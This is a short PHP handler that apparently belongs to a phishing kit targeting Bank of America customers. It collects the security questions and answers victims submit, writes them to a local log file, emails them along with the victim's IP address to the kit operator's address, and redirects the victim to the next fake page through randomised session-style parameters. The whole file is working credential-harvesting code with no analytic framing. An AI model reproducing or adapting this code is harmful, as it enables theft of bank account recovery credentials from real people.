<?php

session_start();
$_SESSION['q1'] = $_POST['q1'];
$_SESSION['a1'] = $_POST['a1'] ;
$_SESSION['q2'] = $_POST['q2'];
$_SESSION['a2'] = $_POST['a2'] ;
$_SESSION['q3'] = $_POST['q3'];
$_SESSION['a3'] = $_POST['a3'] ;

$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');

$message .= "----------------------+   Full +-------------------\n";
$message .= "-----------------------------------------------------\n";
$message .= "|".$_POST['q1']."  		  : ".$_POST['a1']."\n";
$message .= "|".$_POST['q2']."  		  : ".$_POST['a2']."\n";
$message .= "|".$_POST['q3']."  		  : ".$_POST['a3']."\n";
$message .= "--------------------+ By Mr JoCk +------------------\n";
$message .= "Client IP: ".$ip." \n";
$subject = "Quetions BOA  By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a"); 
fwrite($file, $message);
$headers = 'From: Mr JoCK <WF@rezult.com>' ;
{
mail($XBALTI_EMAIL,$subject,$message,$headers);
}
header("Location: ./surf3.php?cmd=_update" . md5(microtime()) . "&account_" . md5(microtime()) . "=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "");
?>

